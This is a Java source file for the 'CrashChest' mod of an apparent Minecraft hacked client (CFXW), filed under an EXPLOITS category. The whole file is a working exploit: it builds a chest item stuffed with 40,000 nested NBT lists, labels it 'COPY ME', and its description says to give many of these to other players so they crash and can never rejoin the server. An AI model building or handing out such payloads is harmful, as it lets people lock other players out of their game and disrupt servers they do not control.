
package component.CFXW_client.mods;

import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;

@Mod.Info(category = Mod.Category.EXPLOITS,
	description = "Generates a CrashChest. Give a lot of these to another\n"
		+ "player to make them crash. They will not be able to join the server\n"
		+ "ever again!",
	name = "CrashChest")
public class CrashChestMod extends Mod
{
	@Override
	public void onEnable()
	{
		if(mc.thePlayer.inventory.getStackInSlot(36) != null)
		{
			if(mc.thePlayer.inventory.getStackInSlot(36).getDisplayName()
				.equals("�6�lCOPY ME"))
				CFXW.chat.error("You already have a CrashChest.");
			else
				CFXW.chat.error("Please take off your shoes.");
			setEnabled(false);
			return;
		}else if(!mc.thePlayer.capabilities.isCreativeMode)
		{
			CFXW.chat.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		ItemStack stack = new ItemStack(Blocks.chest);
		NBTTagCompound nbtTagCompound = new NBTTagCompound();
		NBTTagList nbtList = new NBTTagList();
		for(int i = 0; i < 40000; i++)
			nbtList.appendTag(new NBTTagList());
		nbtTagCompound.setTag("www.CFXW-client.tk", nbtList);
		stack.setTagInfo("www.CFXW-client.tk", nbtTagCompound);
		mc.thePlayer.getInventory()[0] = stack;
		stack.setStackDisplayName("�6�lCOPY ME");
		CFXW.chat.message("A CrashChest was placed in your shoes slot.");
		setEnabled(false);
	}
}
